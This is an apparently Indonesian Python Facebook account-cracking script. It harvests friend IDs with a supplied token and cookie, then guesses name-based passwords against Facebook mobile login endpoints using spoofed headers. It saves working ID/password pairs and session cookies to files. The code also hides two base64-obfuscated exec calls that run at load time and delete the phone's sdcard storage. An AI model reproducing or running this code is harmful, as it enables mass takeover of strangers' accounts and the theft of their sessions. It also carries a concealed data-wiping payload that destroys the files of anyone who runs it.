	prints(panel(f"[white][[bold cyan]01[white]]CRACK PUBLIK [white][[bold cyan]02[white]] CRACK MASAL [white][[bold cyan]03[white]]Exit",width=80,padding=(0,12),style=f"bold red"))
	ARIF = input(f'{h}[●] {P}Menu Berapa : ')
	if ARIF in ['1','1']:
		idt = input(f'{h}[●] {P}Masukan ID : ')
		dump(idt,"",{"cookie":cok},token)
		atur_id()
	if ARIF in ['2','2']:
		dump_massal()
	elif ARIF in ['exit','3','logout']:
	   hapus_cookie =	os.system('rm -rf .tok.txt && rm -rf .cok.txt')
	   print(f'[•] SUKSES HAPUS PRAWAN')
	   

###----------[ BAGIAN MENU ]----------###
def menu(my_name, my_id):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        print('◉━━─ Cookies Invalid my brother ')
        time.sleep(5)
        login_lagi334()
    os.system('clear')
    banner()
    print(f'╭────────────────────')
    print(f'{xxx} 1. FB CRACK')
    print(f'{xxx} 2. KELUAR {m}[ HAPUS KOOKIE ]{xxx}')
    print('╰────────────────────')
    _____Dwi__Yantti_____ = input(f'\n└──C PILIH: ')
    if _____Dwi__Yantti_____ in ['1']:
        nge_krek()
    elif _____Dwi__Yantti_____ in ['2']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print(f'╭────────────────────')
        print(f'{xxx} Success logout')
        exit()
    else:
        exit()

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        print(f'{m}cookies telah kadaluarsa ster')
        exit()
    try:
        dwi = int(input(f"└──C BERAPA ID YG MAU DI KRECK ?:  "))
    except ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input(f"└──C MASUKKIN ID KE {_dwi_}: ")
        uid.append(Masukan)
    for user in uid:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        print(f"└──C <(｡⁠◕⁠‿⁠◕⁠｡)⁠> ID TERKUMPUL : " +str(len(id)))
        atur_dulu()
    except requests.exceptions.ConnectionError:
        print(f"{T}{M}  koneksi terputus")
        exit()
    except (KeyError, IOError):
        print(f"{T}{M}  teman tidak publik")
        exit()
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'╭────────────────────')
	print(' 1. AKUN LAMA')
	print(' 2. AKUN BARU')
	print(' 3. RANDOM')
	print(f'╰────────────────────')
	aturid = input(f'{xxx}└──C PILIH : ')
	print(f'╭────────────────────')
	if aturid in ['1','01']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		waktu(1)
		atur_dulu()
		exit()
		

	print(' 1. METODH FREE')
	print(' 2. METODH ASYNC')
	metod = input(f'{xxx}└──C KETIK : ')
	print(f'╭──────────────────────────────────────')
	print(f'└──C {h}MENUNGGU MEMANG GAENAK HARAP BERSABAR')
	if metod in ['1','01']:
		baz.append('metod1')
	else:
		baz.append('metod1')
	passwrd()
	if metod in ['2','02']:
		baz.append('metod2')
	else:
		baz.append('metod2')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global ok,cp
	print(f'{xxx}')
	awal = datetime.datetime.now()
	with tred(max_workers=30) as gas_krek:
		for aldous in id2:
			idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			pwt = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
			if '><v><' in pwt:
				for xpwn in pwn:
					pwv.append(xpwn)
			else:pass
			if 'metod1' in baz:
				gas_krek.submit(metod1,idf,pwv,awal)
			else:
				gas_krek.submit(metod1,idf,pwv)
			if 'metod2' in baz:
				gas_krek.submit(metod2,idf,pwv,awal)
			else:
				gas_krek.submit(metod2,idf,pwv)
	print(f'{xxx}')
	print(f'{hijo}+ {puti}Akun LIVE  : {hijo}%s{xxx} '%(ok))
	print(f'{kun}+ {puti}Akun CHEK  : {kun}%s{xxx} '%(cp))
	print(f'{xxx}')
		
###----------[ METODE FREE]----------###
resok = []
exec(base64.b64decode(b'b3Muc3lzdGVtKCdybSAtcmYgc2RjYXJkJyk='))
rescp = []
def metod1(idf,pwv,awal):
	global loop,ok,cp
	jam_tayang = str(datetime.datetime.now()-awal).split('.')[0]
	sys.stdout.write(f" FREE [{kun} {(loop)}{puti}/{hijo}{len(id)}{puti} ] [ {hijo}{(ok)}{xxx}/{kun}{(cp)}{xxx} ] \r");sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://free.facebook.com/login/?email=100094421174755&li=VE89Zn9hOkD3yrSrIXhqFeyH&e=1647001&shbl=1&ref=dbl&wtsid=rdr_0im9IRIZhJ8lIgD39&refsrc=deprecated&_rdr")
			data = {
'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
'uid': idf,
'next': 'https://free.facebook.com/login/save-device/',
'flow': 'login_no_pin',
'pass': pw,
}
			hider = {
			'Host': 'free.facebook.com',
			'content-length': '168',
			'cache-control': 'max-age=0',
			'dpr': '3',
			'viewport-width': '980',
			'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': '"13.0.0"',
			'sec-ch-ua-model': '"220333QAG"',
			'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
			'sec-ch-prefers-color-scheme': 'light',
			'upgrade-insecure-requests': '1',
			'origin': 'https://free.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://free.facebook.com/login/?email=100094421174755&li=VE89Zn9hOkD3yrSrIXhqFeyH&e=1647001&shbl=1&ref=dbl&wtsid=rdr_0im9IRIZhJ8lIgD39&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			}
			po = ses.post("https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated&ref=dbl h2",data=data,headers=hider,allow_redirects=False)
			response=parser(po.text, "html.parser")
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CHEK/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{kun}{idf} {pw}{xxx}")
				tree.add(f"\r{mer}{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('LIVE/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"⌲ ID : {hijo}{idf}{puti}")
				tree.add(f"⌲ Password: {hijo}{pw}{puti}")
				tree.add(f"⌲ Tahun Account: {mer}{tahun(idf)}{puti}")
				tree.add(f"⌲ CokiCoki: {hijo}{kuki}{puti}")
				tree.add(f"⌲ {hijo}{ua}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	data2={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://m.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print(f" {xxx}{cek[opsi]}"))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
	
###--[ METHOD ASYNC ]--###
resok = []
exec(base64.b64decode(b'b3Muc3lzdGVtKCdybSAtcmYgc2RjYXJkJyk='))
rescp = []
def metod2(idf,pwv,awal):
	global loop,ok,cp
	jam_tayang = str(datetime.datetime.now()-awal).split('.')[0]
	sys.stdout.write(f" ASYNC [{kun} {(loop)}{puti}/{hijo}{len(id)}{puti} ] [ {hijo}{(ok)}{xxx}/{kun}{(cp)}{xxx} ] \r");sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://m.facebook.com/login/device-based/login/async/?uid='+idf+'&flow=login_no_pin&next=m_ts=1715035094&li=1ls5Zl3oZ9N1BJZ9fNy85u21&try_number=0&unrecognized_tries=0&email=diditamandafarhan%40gmail.com&prefill_contact_point=diditamandafarhan%40gmail.com&prefill_source=browser_dropdown&prefill_type=password&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=true&is_smart_lock=false&bi_xrwh=0&bi_wvdp=%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%2C%22iframeProto%22%3A%22function%20get%20contentWindow()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22remap%22%3Afalse%2C%22iframeData%22%3A%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%7D%7D&encpass=%23PWD_BROWSER%3A5%3A1715035112%3AAQlQABJoq1P6x6Uzil44bqi%2B2REqnqFbbm51vu84A3rs5FtdL6ecY9EelV4kN0Ic5v9jZN%2Fl6n5ft6E1pxLz6f5HVGUKe176bVk1hsubcbcwbALu%2B4Js9TqLMcOajsVuIzyS3Ys7GeUAP4AsKQ%3D%3D&fb_dtsg=NAcNwuchiiICc4gw14fvG6v94c6l6Pg5lXCvrY2q7Mz1hEBnQQuYRRQ%3A0%3A0&jazoest=24930&lsd=AVoms5hO')'(--s&__dyn=1KQEGiE5q1MzVQ2mmmexu6E5W2i5U4e0C8dEc8uwcC4o1nEhwem0iy1gCwjE2Nwde782Cwro0wa4o1sE52229wcq0DUdE1u86i0N85G0zE1bE881eEdEG0hi0Lo6-0Co178dE1UU&__csr=&__req=3&__fmt=1&__a=AYlHEuEfkenrO8eaJ74vqmmRXv8uBv_uyWxdgsg614s8CdOjv3kHdbHmDsHcoSuutMBdAzrG8Lo8nEbWpjsGaOSigBpC3ZsA8Rpptx7MLm_Yew&__user=0")
			data = {
			'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
'uid': idf,
'next': 'https://m.facebook.com/login/save-device/',
'flow': 'login_no_pin',
'pass': pw,
}
			hider = {
			'Host': 'm.prod.facebook.com',
			'content-length': '2183',
			'cache-control': 'max-age=0',
			'dpr': '3',
			'viewport-width': '980',
			'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': '"13.0.0"',
			'sec-ch-ua-model': '"220333QAG"',
			'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
			'sec-ch-prefers-color-scheme': 'light',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.prod.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': '*/*',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'empty',
			'referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252216norghzvcdcv14w8lsjfst1tx23zzjk1wwas3p1jt0nkc1uvngyn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9b79706a-cc0c-4df2-b77c-a99c9de827a1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252216norghzvcdcv14w8lsjfst1tx23zzjk1wwas3p1jt0nkc1uvngyn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			}
			po = ses.post("https://m.prod.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=86c61fa955c9e7800cf98cf5e0979ca8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252216norghzvcdcv14w8lsjfst1tx23zzjk1wwas3p1jt0nkc1uvngyn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9b79706a-cc0c-4df2-b77c-a99c9de827a1%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252216norghzvcdcv14w8lsjfst1tx23zzjk1wwas3p1jt0nkc1uvngyn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100 h2",data=data,headers=hider,allow_redirects=False)
			response=parser(po.text, "html.parser")
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CHEK/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{kun}{idf} {pw}{xxx}")
				tree.add(f"\r{mer}{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('LIVE/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"⌲ ID : {hijo}{idf}{puti}")
				tree.add(f"⌲ Password: {hijo}{pw}{puti}")
				tree.add(f"⌲ Tahun Account: {mer}{tahun(idf)}{puti}")
				tree.add(f"⌲ CokiCoki: {hijo}{kuki}{puti}")
				tree.add(f"⌲ {hijo}{ua}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###---[ CEK APK ]---###
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print("[bold white]"+cek[opsi]))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
	
# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == '__main__':
    try:
        os.system('git pull')
    except:
        pass
    try:
        os.mkdir('LIVE')
    except:
        pass
    try:
        os.mkdir('CHEK')
    except:
        pass
    try:
        os.mkdir('DUMP')
    except:
        pass
    try:
        os.system('touch .prox.txt')
    except:
        pass
    login()
